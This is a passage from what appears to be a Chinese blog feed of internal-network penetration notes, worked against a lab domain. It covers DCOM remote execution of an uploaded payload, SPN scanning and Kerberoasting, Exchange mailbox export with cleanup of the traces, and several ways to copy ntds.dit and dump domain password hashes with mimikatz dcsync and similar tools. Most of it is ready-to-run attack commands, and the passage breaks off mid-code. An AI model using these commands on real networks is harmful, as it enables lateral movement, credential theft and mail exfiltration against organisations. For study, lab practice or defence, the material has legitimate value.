class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use \\10.10.10.11 <span class="hljs-string">&quot;274355ZWz&quot;</span> /user:de1ay<br></code></pre></td></tr></table></figure><p>2.调用MMC20.Application远程执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$com</span>=[activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;10.10.10.11&quot;</span>))<br><span class="hljs-variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c c:\one.exe&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br></code></pre></td></tr></table></figure><p>先通过ipc将payload上传到目标机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy one.exe \\10.10.10.11\c$<br></code></pre></td></tr></table></figure><p>在执行上述命令<br><img src="https://img-blog.csdnimg.cn/20210605133633686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上线，并且是管理员权限<br>3.调用9BA05972-F6A8-11CF-A442-00A0C90A8F39</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$com</span>=[Type]::GetTypeFromCLSID(<span class="hljs-string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="hljs-string">&quot;10.10.10.11&quot;</span>)<br><span class="hljs-variable">$obj</span>=[System.Activator]::CreateInstance(<span class="hljs-variable">$com</span>)<br><span class="hljs-variable">$item</span>=<span class="hljs-variable">$obj</span>.item()<br><span class="hljs-variable">$item</span>.Document.Application.ShellExecute(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c c:\one&quot;</span>,<span class="hljs-string">&quot;c:\windows\system32&quot;</span>,<span class="hljs-variable">$null</span>,0)<br><br></code></pre></td></tr></table></figure><h2 id="SPN在域环境中的应用"><a href="#SPN在域环境中的应用" class="headerlink" title="SPN在域环境中的应用"></a>SPN在域环境中的应用</h2><p>windows域环境是基于微软的活动目录服务工作的，它在网路系统环境中将物理位置分散、所属部门不同的用户进行分组，集中资源管理。有效的地对资源访问控制权限进行细粒度的分配，提高了网路环境的安全性及网络资源统一分配管理的便利性。</p><p>SPN命令的格式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">SPN=serviceclass <span class="hljs-string">&quot;/&quot;</span> hostname [<span class="hljs-string">&quot;:&quot;</span>port] [<span class="hljs-string">&quot;/&quot;</span> servicename]<br> <br>serviceclass 服务组件的名称<br>hostname 以<span class="hljs-string">&quot;/&quot;</span>与面的名称分隔，是计算机的FQDN（全限定域名，同时带有计算机名和域名)<br>port  以冒号分隔，后面的内容为该服务监听的端口<br>servicename  一个字符串，可以是服务的专有名称<br></code></pre></td></tr></table></figure><p>常见的SPN服务<br>mssql服务的示列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">MSSQLSvc/computer1.pentest.com:1433<br>MSSQLSvc  服务组件的名称，此处为mssql服务<br>computer.pentest.com 主机名为computer,域名为pentest.com<br>1433 监听端口为1433<br></code></pre></td></tr></table></figure><p>servicecass和hostname是必选参数,port和servicename是可选参数</p><ul><li><strong>SPN扫描的powershell脚本</strong><br><a href="https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon</a><br>SPN扫描也称作“扫描Kerberos服务实例名称”<br><img src="https://img-blog.csdnimg.cn/20210605145845201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里面有很多扫描spn服务的脚本也有扫描所有服务的<br>1.扫描mssql服务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">import-moudle .\Discover-PSMSSQL-Servers.ps1<br>Discover-PSMSSQLServers<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210605150153434.png" alt="在这里插入图片描述"><br>2.扫描所有服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">import-module .\Discover-PSInteresestingServices.ps1<br>Discover-PSInteresestingServices<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021060515041918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在不使用第三方powershell脚本的情况下,输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -T domain -q */*<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210605151129866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>Kerberoast攻击分析与防范</strong><br>1.配置mssql服务 ，破解该服务的票据<br>手动注册</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -A MSSQLSvc/computer.de1ay.com:1433  mssql<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210605160525756.png" alt="在这里插入图片描述"><br>2.查看用户对应的SPN<br>查看指定用户注册的SPN</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -L de1ay.com\mssql<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210605160716988.png" alt="在这里插入图片描述"><br>查看所有注册的SPN</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -T domain -q */*<br></code></pre></td></tr></table></figure><p>3.配置指定服务的登录权限<br>在活动目录中为用户配置指定服务的登录权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpedit.msc \Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights Assignment\Log on as a service <br></code></pre></td></tr></table></figure><p>4.修改加密类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpedit.msc\Computer Configuration\Windows Setting\Security Settings\Local Policies\Seurity Options\Network security: Configure encryption types allowed <span class="hljs-keyword">for</span> Kerberos<br></code></pre></td></tr></table></figure><p>5.请求SPN Kerberos票据<br>打开powershell输入如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Add-Type -AssemblyName System.IdentityModel <br>New-Object System.IdentityModel.Tokens.KerberosRequestor SecurityToken -ArgumentList <span class="hljs-string">&quot;MSSQLSvc/de1ay.de1ay.com&quot;</span><br></code></pre></td></tr></table></figure><p>两篇干货文章</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA%3D%3D&amp;chksm=fc781175cb0f986392b4c78112dcd01bf5c71e7d6bdc292f0d8a556cc27e6bd8ebc54278165d&amp;idx=1&amp;mid=2247488936&amp;scene=21&amp;sn=82c127c8ad6d3e36f1a977e5ba122228<span class="hljs-comment">#wechat_redirect</span><br><br>https://blog.csdn.net/shuteer_xu/article/details/106030671<br><br></code></pre></td></tr></table></figure><h2 id="Exchange邮件服务"><a href="#Exchange邮件服务" class="headerlink" title="Exchange邮件服务"></a>Exchange邮件服务</h2><ul><li><strong>Exchange服务发现</strong><br>1.基于端口发现<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A -O -sV 192.168.43.1<br></code></pre></td></tr></table></figure>2.SPN查询<br>在安装Exchange时，SPN就被注册在活动目录中了。在域环境中通过SPN来发现Exchange服务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setspn -T de1ay.com -F -Q */*<br></code></pre></td></tr></table></figure><ul><li><strong>Exchange的基本操作</strong><br>Exchange是一个电子邮件系统，那么其中必然存在数据库。Exchange数据库的后缀为”.edb”。.<br>1.查看邮件数据库<br>在powershell命令行环境中输入<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-MailboxDatabase -server <span class="hljs-string">&quot;Exchange1&quot;</span><br></code></pre></td></tr></table></figure>在正常的powershell中没有这条命令的，需要输入如下命令。将Exchange管理单元添加到当前会话。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">add-pssnapin microsoft.exchange*<br></code></pre></td></tr></table></figure><p>可以指定数据库，对其详细信息进行查询。查询数据库物理路径。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-MailboxDatabase -Identity <span class="hljs-string">&#x27;Mailbox Database 188899384&#x27;</span> | Format-List Name,EdbFilePath,LogFolderPath<br></code></pre></td></tr></table></figure><p>2.获取现有用户的邮件地址<br>使用powershell进行查询，列举Exchange中所有的用户及其邮件地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-Mailbox | format-tables Name,WindowsEmaiAddress<br></code></pre></td></tr></table></figure><p>3.查看指定用户的邮箱使用信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">get-mailboxstatistics -identity administrator | select DisplayName,ItemCount,TotalItemSize,LastLogonTime<br></code></pre></td></tr></table></figure><p>4.获取用户邮箱中的邮件数量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | Sort-Object TotalItemSize -Descend<br></code></pre></td></tr></table></figure><ul><li><strong>导出指定的电子邮件</strong><br>Exchange邮件的文件后缀为“.pst”,在Exchange server 2007中导出邮件，需要使用Export-Mailbox命令。在Exchange Server 2010 SP1及以后的版本的Exchange中导出邮件，可以使用 图形化界面，也可以使用powershell<br>1.配置用户导出\导出的权限<br>查看有导入导出权限的用户</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-ManagementRoleAssignment -role <span class="hljs-string">&quot;Mailbox Import Export&quot;</span> | Format-List RoleAssigneeName<br></code></pre></td></tr></table></figure><p>2.添加权限<br>将Adminstrator用户添加到Mailbox Import Export角色中，就可以通过Powershell导出用户的邮件了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">New-ManagementRoleAssignment -Name <span class="hljs-string">&quot;Import Export_Domain Admins&quot;</span> -User <span class="hljs-string">&quot;Administrator&quot;</span> -Role <span class="hljs-string">&quot;Mailbox Import Export&quot;</span><br></code></pre></td></tr></table></figure><p>3.删除权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Remove-ManagementRoleAssignment  <span class="hljs-string">&quot;Import Export_Domain Admins&quot;</span> -Confirm:<span class="hljs-variable">$false</span><br></code></pre></td></tr></table></figure><p>在将用户添加到角色组中，需要重启Exchange服务器才能执行导出操作</p><ul><li><strong>设置网络共享文件夹</strong><br>不论那种方式导出邮件，都需要将文件放置在UNC（共享文件)路径下</li></ul><p>设置共享文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">net share inetpub=c:\inetpub /grant:everyone,full<br></code></pre></td></tr></table></figure><p>设置成功后可以是使用net share查看</p><ul><li><strong>导出用户的电子邮件</strong><br>1.使用powershell导出电子邮件<br>用户的电子邮箱目录一般分为Inbox(收件箱），SentItems（已发送邮件),DeletedItems（已删除邮件),Drafts（草稿)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">New-MailboxExportRequest -Mailbox administrator -FilePath \\10.10.10.11\inetpub\administrator.pst<br></code></pre></td></tr></table></figure><ul><li><strong>管理导出请求</strong><br>不论是使用powershell导出电子邮件，还是图形化都会留下相关信息。<br>在powershell中输入</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-MailboxExportRequest<br></code></pre></td></tr></table></figure><p>查看导出请求<br>使用如下命令可以将指定用户的已完成导出请求删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Remove-MailboxExportRequest -Identity Administrator\mailboxexport<br></code></pre></td></tr></table></figure><p>使用如下命令可以将所有已完成的导出请求删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>域内横向移动</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域控制器安全</title>
    <link href="/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/"/>
    <url>/2022/06/15/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通常情况下，即使拥有管理员权限，也无法读取域控制器中的C:\windows\NTDS\ntds.dit文件（活动目录始终访问这个文件）。使用windows本地卷影拷贝服务，就可以获得文件的副本。</p><h2 id="使用卷影拷贝服务提取ntds-dit"><a href="#使用卷影拷贝服务提取ntds-dit" class="headerlink" title="使用卷影拷贝服务提取ntds.dit"></a>使用卷影拷贝服务提取ntds.dit</h2><p>在活动目录中，所有的数据都保存在ntds.dit文件中。ntds.dit是一个二进制文件，储存位置为域控制器的%SystemRoot%\ntds\ntds.dit。ntds.dit中包含(但不限于)用户名，散列值，组，GPP，OU等与活动目录相关的信息。它和SAM文件一样，是被Windows操作系统锁定的。</p><ul><li><strong>使用ntdsutil.exe提取ntds.dit</strong><br>ntdsutil.exe是一个为活动目录提供管理机制的命令行工具。使用ntdsutil.exe,可以维护和管理活动目录数据库，控制单个主机操作，创建引用程序目录分区，删除由未使用活动目录安装向导成功降级的域控制器留下的元数据等。该工具默认安装在域控制器上，可以在域控制器上直接操作，也可以通过域内机器在域控制器上远程操作。ntdsutil.exe支持的操作系统由windows server2003,windows server 2008,windwos server  2012。</li></ul><p>在域控制器的命令行环境中输入如下命令，创建快照。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil snapshot <span class="hljs-string">&quot;activate instance ntds&quot;</span> create quit quit<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021060719184545.png" alt="在这里插入图片描述"></p><p>可以看到创建了一个GUID为0c5ecd15-d722-41fa-9e0a-424c4d19ac64的快照</p><p>加载刚刚的快照</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil snapshot <span class="hljs-string">&quot;mount &#123;0c5ecd15-d722-41fa-9e0a-424c4d19ac64&#125;&quot;</span> quite quite<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607192246797.png" alt="在这里插入图片描述"><br>使用如下命令将文件复制出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy C:\$SNAP_202106071917_VOLUMEC$\windows\ntds\ntds.dit  c:\temp\ntds.dit<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607192837833.png" alt="在这里插入图片描述"><br>输入如下命令将之前加载的快照卸载并删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil snapshot <span class="hljs-string">&quot;unmount &#123;0c5ecd15-d722-41fa-9e0a-424c4d19ac64&#125;&quot;</span> <span class="hljs-string">&quot;delete &#123;0c5ecd15-d722-41fa-9e0a-424c4d19ac64&#125;&quot;</span> quite quite<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607193052856.png" alt="在这里插入图片描述"></p><p>查看当前系统中的所有快照</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil snapshot <span class="hljs-string">&quot;List All&quot;</span> quite quite<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607193303358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>之前创的没有删除所以有这么多</p><ul><li><strong>利用vssadmin提取ntds,dit</strong><br>vssadmin是windows server 2008 及windows 7提供的vss管理工具，可用于创建和删除卷影拷贝，列出卷影拷贝的信息（只能管理系统provider创建的卷影拷贝),显示已安装的所有卷影拷贝写入程序(writers)和提供程序(providers)，以及改变卷影拷贝的储存空间。</li></ul><p>创建一个c盘卷影</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vssadmin create shadow /for=c:<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607200157738.png" alt="在这里插入图片描述"></p><p>在创建的卷影拷贝中将ntds.dit复制出来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\windows\NTDS\ntds.dit  c:\ntds.dit<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607211731845.png" alt="在这里插入图片描述"><br>删除卷影</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vssadmin delete shadows /for=c: /quiet<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607211940763.png" alt="在这里插入图片描述"></p><ul><li><strong>利用vssown.vbs脚本提取ntds.dit</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#启动卷影拷贝服务</span><br>cscript vssown.vbs /start<br><span class="hljs-comment">#创建一个c盘的卷影拷贝</span><br>cscript vssown.vbs /create c<br><span class="hljs-comment">#列出当前卷影拷贝</span><br>cscript vssown.vbs /list<br><span class="hljs-comment">#删除卷影拷贝</span><br>cscript vssown.vbs /delete &#123;GUID&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607212823506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210607212924122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后可以通过copy命令将其复制出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit<br></code></pre></td></tr></table></figure><ul><li><strong>使用ntdsutil的IFM创建卷影拷贝</strong><br>在域控制器中以管理员模式打开命令行环境，输入如下命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ntdsutil <span class="hljs-string">&quot;ac i ntds&quot;</span> <span class="hljs-string">&quot;ifm&quot;</span> <span class="hljs-string">&quot;create full c:/test&quot;</span> q q<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607214834441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210607215620557.png" alt="在这里插入图片描述"><br>将其拖到本地后删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rmdir</span> /s/q <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210607215731639.png" alt="在这里插入图片描述"></p><ul><li><strong>使用diskshadow导出ntds.dit</strong><br>在渗透测试中可以使用diskshadow.exe来执行命令。例如将需要执行的命令”exec c:\windows\system32\calc.exe”<br>写入C盘目录下的command.txt文件<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">diskshadow /s c:\command.txt<br></code></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20210608165550423.png" alt="在这里插入图片描述"></li></ul><p>使用diskshadow.exe也可以用来导出ntds.dit。将如下命令写入一个文本文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> context persistent nowriters<br>add volume c: <span class="hljs-built_in">alias</span> someAlias<br>create<br>expose %someAlias% k:<br><span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;cmd.exe&quot;</span> /c copy k:\Windows\NTDS\ntds.dit c:\ntds.dit<br>delete shadows all<br>list shadows all<br>reset<br><span class="hljs-built_in">exit</span><br><br><br>diskshadow /s c:\Users\de1ay\Desktop\command.txt<br><br>reg save hklm\system c:\system.hive<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210608170442131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功导出</p><h2 id="导出ntds-dit中散列值"><a href="#导出ntds-dit中散列值" class="headerlink" title="导出ntds.dit中散列值"></a>导出ntds.dit中散列值</h2><ul><li><strong>使用esedbexport恢复ntds.dit</strong><br>1.导出ntds.dit<br>安装好该软件<br><a href="https://github.com/libyal/libesedb/releases/tag/20210424">https://github.com/libyal/libesedb/releases/tag/20210424</a><br>将文件拖入kali中</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">esedbexport -m tables ntds.dit<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210608211537495.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2.导出散列值</p><p>ntdsxtract</p><ul><li><strong>使用impacket工具包导出散列值</strong></li></ul><p>impacket-secretsdump</p><ul><li><strong>在windows在解析ntds.dit</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\NTDSDumpEx.exe -d ntds.dit -s .\system.hive<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210608223759966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="利用dcsync获取域散列值"><a href="#利用dcsync获取域散列值" class="headerlink" title="利用dcsync获取域散列值"></a>利用dcsync获取域散列值</h2><ul><li><strong>使用mimikatz转储域散列值</strong><br>以域管理员权限打开命令行环境，运行mimikatz。输入如下命令，使用mimikatz导出域内的所有用户及散列值</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::dcsync /domain:de1ay.com /all /csv<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210609193413491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>使用mimikatz的dcsync功能也可以导出指定用户的散列值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::dcsync /domain:de1ay.com /user:de1ay<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210609193652451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>也可以直接在域控制器中运行Mimikatz，通过转储lsass.exe进程对散列值进行Dump操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">privilege::debug<br>lsadump::lsa /inject<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210609194346493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>使用dcsync获取账号和域散列值</strong><br>Invoke-DCSync.ps1可以利用dcsync直接读取ntds.dit，以获取域账号和域散列值</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Invoke-DCSync -PWDumpFormat<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210609201159461.png" alt="在这里插入图片描述"></p><p>项目地址：<a href="https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1">https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1</a></p><h2 id="使用msf获取域散列值"><a href="#使用msf获取域散列值" class="headerlink" title="使用msf获取域散列值"></a>使用msf获取域散列值</h2><ul><li><p><strong>psexec_ntdsgrad</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 